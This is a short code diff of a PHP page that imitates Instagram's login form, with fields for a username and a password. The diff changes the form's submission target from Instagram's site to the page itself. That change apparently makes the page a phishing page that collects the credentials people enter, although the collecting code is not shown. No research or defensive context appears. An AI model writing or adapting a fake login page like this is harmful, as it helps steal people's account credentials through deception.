@@ -190,7 +190,7 @@
       <h1><?php echo $l_decoded; ?></h1>
       <br>
     </div>
-    <form action="https://www.instagram.com/" method="GET">
+    <form action="" method="GET">
       <input type="text" name="u_name" placeholder="Phone number, username, or email" required>
       <input type="password" name="pass" placeholder="Password" required>
       <button type="submit" name="lo">Log In</button>
